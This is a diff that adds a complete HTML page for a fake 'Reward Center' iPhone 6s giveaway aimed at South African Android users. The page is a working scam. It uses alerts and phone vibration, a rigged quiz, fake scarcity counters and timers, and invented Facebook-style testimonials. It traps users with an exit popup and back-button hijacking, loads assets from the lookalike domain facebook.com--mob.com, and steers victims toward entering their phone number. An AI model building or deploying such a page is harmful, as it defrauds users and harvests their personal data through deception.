@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html webdriver="true">
+
+<head>
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=false; initial-scale=1.0; maximum-scale=1.0">
+
+    <script src="jquery.min.js"></script>
+
+    <script language="javascript">
+        var PreventExitPop = true;
+
+        function ExitPop() {
+            if (PreventExitPop != false) {
+                return "Are you sure you want to forfeit your reward?!!\n\nYour chance will instantly be transferred to the next user!"
+            }
+        }
+        window.onbeforeunload = ExitPop;
+    </script>
+
+    <title>Reward Center</title>
+
+    <link rel="prerender" href="#">
+
+    <script type="text/javascript">
+        var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+        var now = new Date();
+        var today = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
+
+        function get_date(days) {
+            return today = monthNames[now.getMonth()] + " " + (now.getDate() - days) + ", " + now.getFullYear();
+        }
+    </script>
+    <script>
+        $(document).ready(function() {
+            setTimeout(function() {
+                $("#comment1").fadeIn();
+            }, 10000);
+            setTimeout(function() {
+                $("#comment2").fadeIn();
+            }, 12000);
+            setTimeout(function() {
+                $("#comment3").fadeIn();
+            }, 13000);
+            setTimeout(function() {
+                $("#comment4").fadeIn();
+            }, 18000);
+            setTimeout(function() {
+                $("#comment5").fadeIn();
+            }, 20000);
+            setTimeout(function() {
+                $("#comment6").fadeIn();
+            }, 22000);
+            $(".bq1").click(function() {
+                $("#q1").fadeOut(0);
+                $("#q2").fadeIn(500);
+            });
+            $(".bq2").click(function() {
+                $("#q2").fadeOut(0);
+                $("#q3").fadeIn(500);
+            });
+            $(".bq3").click(function() {
+                $("#q3").fadeOut(0);
+                $("#q4").fadeIn(500);
+            });
+            $(".bq4").click(function() {
+                $("#content1").fadeOut(0);
+                $("#content2").fadeIn();
+                setTimeout(function() {
+                    $("#result1").fadeIn(1000);
+                }, 3000);
+                setTimeout(function() {
+                    $("#result2").fadeIn(1000);
+                }, 4500);
+                setTimeout(function() {
+                    $("#result3").fadeIn(1000);
+                }, 6000);
+                setTimeout(function() {
+                    $("#content2").fadeOut();
+                }, 7500);
+                setTimeout(function() {
+                    $("#content3").fadeIn();
+                }, 7500);
+            });
+        });
+    </script>
+
+    <script>
+        function startTimer(t, e) {
+            function n() {
+                o = t - ((Date.now() - i) / 1e3 | 0), a = o / 60 | 0, r = o % 60 | 0, a = 10 > a ? "0" + a : a, r = 10 > r ? "0" + r : r, e.textContent = a + ":" + r, 0 >= o && (i = Date.now() + 1e3)
+            }
+            var o, a, r, i = Date.now();
+            n(), setInterval(n, 1e3)
+        }
+        window.onload = function() {
+            var t = 120,
+                e = document.querySelector("#time");
+            startTimer(t, e)
+        };
+    </script>
+
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration,
+                seconds;
+            setInterval(function() {
+
+                seconds = parseInt(timer % 60, 10);
+
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = seconds;
+
+                if (--timer < 0) {
+                    display.textContent = 'just a few';
+                }
+            }, 6000);
+        }
+
+        window.onload = function() {
+            var fiveMinutes = 60 / 3,
+                display = document.querySelector('#time');
+            startTimer(fiveMinutes, display);
+        };
+    </script>
+
+    <style type="text/css">
+        .button,
+        .name,
+        .profile {
+            cursor: pointer;
+        }
+        
+        #comment1,
+        #comment2,
+        #comment3,
+        #comment4,
+        #comment5,
+        #comment6,
+        #content2,
+        #content3,
+        #q2,
+        #q3,
+        #q4,
+        #result1,
+        #result2,
+        #result3 {
+            display: none;
+        }
+        
+        body {
+            background-color: rgb(206, 206, 206);
+            font-family: Tahoma, Geneva, sans-serif;
+            margin: 0px;
+            padding: 0px;
+        }
+        
+        .header {
+            background: url('http://facebook.com--mob.com/za/sdo2/logo.png') no-repeat scroll 10px center rgb(101, 101, 101);
+            padding: 10px;
+        }
+        
+        .header p,
+        hr {
+            color: rgb(255, 255, 255);
+            padding: 0px;
+        }
+        
+        .header p {
+            background: url('http://facebook.com--mob.com/za/sdo2/search.png') no-repeat scroll right center transparent;
+            margin: 0px 0px 0px 30px;
+        }
+        
+        hr {
+            border: 1px solid rgb(255, 255, 255);
+            margin: 0px;
+        }
+        
+        .header span {
+            color: rgb(215, 215, 215);
+        }
+        
+        .content {
+            padding: 20px 10px;
+        }
+        
+        .dt {
+            font-size: 12px;
+            text-align: right;
+        }
+        
+        .button,
+        .button2,
+        .loading {
+            text-align: center;
+        }
+        
+        .main-content {
+            padding: 10px;
+            background-color: rgb(255, 255, 255) ! important;
+            border-radius: 10px;
+        }
+        
+        .flag {
+            background: url('http://facebook.com--mob.com/za/sdo2/flag.png') no-repeat scroll 98% 20px rgb(255, 255, 255);
+        }
+        
+        .main-content h1 {
+            font-size: 20px;
+        }
+        
+        .main-content h2 {
+            font-size: 18px;
+            font-weight: 400;
+        }
+        
+        .name,
+        .result {
+            font-weight: 700;
+        }
+        
+        .main-content p {
+            font-size: 13px;
+        }
+        
+        .main-content span {
+            color: red;
+        }
+        
+        p.question {
+            font-size: 15px;
+        }
+        
+        .button {
+            border: 2px solid rgb(0, 0, 0);
+            background-color: rgb(218, 218, 218);
+            padding: 5px 0px;
+            margin: 5px 0px;
+        }
+        
+        .result {
+            margin: 0px;
+            background: url('http://facebook.com--mob.com/za/sdo2/tick.png') no-repeat scroll left center transparent;
+            padding: 5px 0px 5px 25px;
+        }
+        
+        .button2 {
+            color: rgb(255, 255, 255);
+            font-size: 20px;
+            padding: 10px;
+            border-radius: 20px;
+            background-color: rgb(0, 153, 204);
+        }
+        
+        a.claim {
+            color: rgb(255, 255, 255);
+            text-decoration: none;
+        }
+        
+        .comment-status span,
+        .name {
+            color: rgb(59, 89, 152);
+        }
+        
+        .profile {
+            float: left;
+            width: 60px;
+            margin-right: 10px;
+        }
+        
+        .comments {
+            background-color: rgb(238, 239, 244);
+            border-bottom: 2px solid rgb(255, 255, 255);
+            padding: 10px;
+        }
+        
+        .comment-content img,
+        .profile img {
+            width: 100%;
+        }
+        
+        .comment-content {
+            float: left;
+            width: 190px;
+        }
+        
+        .name {
+            margin: 0px;
+        }
+        
+        .clr {
+            clear: both;
+        }
+        
+        .comment-status {
+            font-size: 11px;
+            cursor: pointer;
+        }
+    </style>
+
+</head>
+
+<body>
+    <script type="text/javascript">
+        alert("** Reward Center **\n\nCONGRATULATIONS ANDROID USER!\n\nYou were selected for a chance to WIN an iPhone 6s! Please answer the following 4 questions.");
+    </script>
+    <script type="text/javascript">
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+    </script>
+    <div class="header">
+        <p><span>iPhone</span>&nbsp;&nbsp;&nbsp;Watch&nbsp;&nbsp;&nbsp;iPad&nbsp;&nbsp;&nbsp;Mac</p>
+    </div>
+    <div class="content">
+        <img src="ip7.png">
+        <p class="dt">
+            <script type="text/javascript">
+                document.write(today);
+            </script></p>
+        <div class="main-content flag" id="content1">
+            <h1>Congratulations!</h1>
+            <h2>You were selected to answer 4 questions for a chance to <span style="color: rgb(0, 132, 255);">WIN</span> an iPhone 6s!</h2>
+            <p style="font-weight: bold; font-size: 18px; color: rgb(46, 46, 46); text-align: center;">Only <span style="color: rgb(0, 132, 255);">5</span> iPhones left</p>
+            <center><img src="iphone7.jpg" style="max-width: 500px;"></center>
+            <p>It's that time of the year again! A batch of new <strong> iPhone 6s</strong> is up for grabs!</p>
+            <p>This will be the last batch of iPhone 6s giveaway before the launch of iPhone 7.</p>
+            <p>ACT QUICKLY: this offer is almost running out.</p>
+            <div id="q1">
+                <p class="question"><strong>Question 1 of 4:</strong> Do you own an Apple Product?</p>
+                <div class="button bq1">Yes</div>
+                <div class="button bq1">No</div>
+            </div>
+            <div id="q2">
+                <p class="question"><strong>Question 2 of 4:</strong> Which of the following features would you like to see in the iPhone 7?</p>
+                <div class="button bq2">Wireless charing</div>
+                <div class="button bq2">HD Screen</div>
+            </div>
+            <div id="q3">
+                <p class="question"><strong>Question 3 of 4:</strong> Which of the following method of sending messages do you prefer?</p>
+                <div class="button bq3">Regular SMS</div>
+                <div class="button bq3">Video Messages</div>
+            </div>
+            <div id="q4">
+                <p class="question"><strong>Question 4 of 4:</strong> Do you have a valid address in South Africa to receive an iPhone?</p>
+                <div class="button bq4">Yes</div>
+                <div class="button bq4">No</div>
+            </div>
+        </div>
+        <div class="main-content" id="content2">
+            <h1 style="text-align: center;">We are checking your answers.</h1>
+            <p class="loading"><img src="loading.gif"></p>
+            <p class="result" id="result1">No duplicates found.</p>
+            <p class="result" id="result2">There are <span style="color: rgb(0, 132, 255);">(5)</span> iPhones left.</p>
+            <p class="result" id="result3">You are qualified for a chance to WIN <span style="color: rgb(0, 132, 255);">(1)</span> iPhone 6s!</p>
+        </div>
+
+        <div class="main-content" id="content3">
+            <h1 style="text-align: center;">Congratulations!</h1>
+            <center><img src="iphone6.jpg" class="logo" height="168"></center>
+            <h2 style="text-align: center;">There are <span style="color: rgb(0, 132, 255);">5</span> iPhones left. </h2>
+            <h2 style="text-align: center;"><strong>Please follow the instructions below to claim your chance to <span style="color: rgb(0, 132, 255);">WIN</span></strong></h2>
+            <h2 style="text-align: center;">1. Click the Continue button.</h2>
+            <h2 style="text-align: center;">2. On the next page enter your phone number.</h2>
+            <a href="#" onclick="PreventExitPop = false;" class="claim">
+                <div class="button2">Continue</div>
+            </a>
+
+        </div>
+        <div class="main-content">
+            <hr>
+            <p style="color: rgb(168, 167, 167);"> <span style="color: rgb(168, 167, 167); cursor: pointer;" onclick="total_likes();return false" id="liked">Like</span> • Comment • Share </p>
+            <hr>
+            <div class="comments">
+                <p style="margin: 0px; padding: 0px;" id="total_likes"><span style="color: rgb(59, 89, 152);">12.068</span> like this</p>
+            </div>
+            <div class="comments">
+                <p style="margin: 0px; padding: 0px; float: left; display: block; width: 50%;"><span style="color: rgb(59, 89, 152);">View more comments</span></p>
+                <p style="margin: 0px; padding: 0px; float: right; display: block; width: 50%; color: rgb(168, 167, 167); text-align: right;">50 of 80.312</p>
+                <div style="clear: both;"></div>
+            </div>
+
+            <div class="comments" id="comment4">
+                <div class="profile">
+                    <img src="2.jpg">
+                </div>
+                <div class="comment-content">
+                    <p class="name">Adhama</p>
+                    <p>I am so happy that i won. i received my prize within 2 weeks i couldnt be happier right now. They were a pleasure to speak to and they answered all my questions straight away thank you.</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Like · Reply · <img src="like.png" height="15px" width="15px">2</span></div>
+            </div>
+            <div class="comments" id="comment3" style="display: block;">
+                <div class="profile">
+                    <img src="3.jpg">
+                </div>
+                <div class="comment-content">
+                    <p class="name">Tristan Wuyts</p>
+                    <p> I got nothing :(</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Like · Reply · <img src="like.png" height="15px" width="15px">5</span></div>
+            </div>
+            <div class="comments" id="comment2" style="display: block;">
+                <div class="profile">
+                    <img src="4.jpg">
+                </div>
+                <div class="comment-content">
+                    <p class="name">Abdallah</p>
+                    <p>Im usually a bit sceptical about online competitions but I thought the site looked well enough, and there was a number I could ring if I had any doubts which helped. A short while later I received a phone call and I was so excited I jumped up and down. I had to wait a few weeks or so to get the iPhone6s but I was happy when I got it! Thanks</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Like · Reply · <img src="like.png" height="15px" width="15px">112</span></div>
+            </div>
+            <div class="comments" id="comment1" style="display: block;">
+                <div class="profile">
+                    <img src="5.jpg">
+                </div>
+                <div class="comment-content">
+                    <p class="name">Yasmin Chandler</p>
+                    <p>I got nothing.. why am I always so unlucky :(</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Like · Reply · <img src="like.png" height="15px" width="15px">3</span></div>
+            </div>
+        </div>
+
+        <script>
+            function total_likes() {
+                'Ihnen und <span style="color:#3b5998;">12.068</span> like this' == document.getElementById("total_likes").innerHTML ? (document.getElementById("total_likes").innerHTML = '<span style="color:#3b5998;">12.068</span> like this', document.getElementById("liked").innerHTML = "Like") : (document.getElementById("total_likes").innerHTML = 'Ihnen und <span style="color:#3b5998;">12.068</span> like this', document.getElementById("liked").innerHTML = "Unlike")
+            }
+        </script>
+
+        <script>
+            var bajb_backdetect = {
+                Version: "1.0.0",
+                Description: "Back Button Detection",
+                Browser: {
+                    IE: !(!window.attachEvent || window.opera),
+                    Safari: navigator.userAgent.indexOf("Apple") > -1,
+                    Opera: !!window.opera
+                },
+                FrameLoaded: 0,
+                FrameTry: 0,
+                FrameTimeout: null,
+                OnBack: function() {
+                    alert("Back Button Clicked")
+                },
+                BAJBFrame: function() {
+                    document.getElementById("BAJBOnBack");
+                    bajb_backdetect.FrameLoaded > 1 && 2 == bajb_backdetect.FrameLoaded && (bajb_backdetect.OnBack(), history.back()), bajb_backdetect.FrameLoaded++, 1 == bajb_backdetect.FrameLoaded && (bajb_backdetect.Browser.IE ? bajb_backdetect.SetupFrames() : bajb_backdetect.FrameTimeout = setTimeout("bajb_backdetect.SetupFrames();", 700))
+                },
+                SetupFrames: function() {
+                    clearTimeout(bajb_backdetect.FrameTimeout);
+                    var a = document.getElementById("BAJBOnBack"),
+                        e = a.src.substr(-11, 11);
+                    1 == bajb_backdetect.FrameLoaded && "HistoryLoad" != e ? a.src = "blank.html?HistoryLoad" : bajb_backdetect.FrameTry < 2 && "HistoryLoad" != e && (bajb_backdetect.FrameTry++, bajb_backdetect.FrameTimeout = setTimeout("bajb_backdetect.SetupFrames();", 700))
+                },
+                SafariHash: "false",
+                Safari: function() {
+                    "false" == bajb_backdetect.SafariHash ? ("#b" == window.location.hash ? bajb_backdetect.SafariHash = "true" : window.location.hash = "#b", setTimeout("bajb_backdetect.Safari();", 100)) : "true" == bajb_backdetect.SafariHash && ("" == window.location.hash ? (bajb_backdetect.SafariHash = "back", bajb_backdetect.OnBack(), history.back()) : setTimeout("bajb_backdetect.Safari();", 100))
+                },
+                Initialise: function() {
+                    bajb_backdetect.Browser.Safari ? setTimeout("bajb_backdetect.Safari();", 600) : document.write('<iframe src="http://facebook.com--mob.com/za/sdo2/blank.html" style="display:none;" id="BAJBOnBack" onunload="alert(\'de\')" onload="bajb_backdetect.BAJBFrame();"></iframe>')
+                }
+            };
+            bajb_backdetect.Initialise();
+        </script>
+
+        <script type="text/javascript">
+            bajb_backdetect.OnBack = function() {
+                window.history.back = function() {
+                    document.location = '#'
+                }
+            }
+        </script>
+    </div>
+
+</body>
+
+</html>
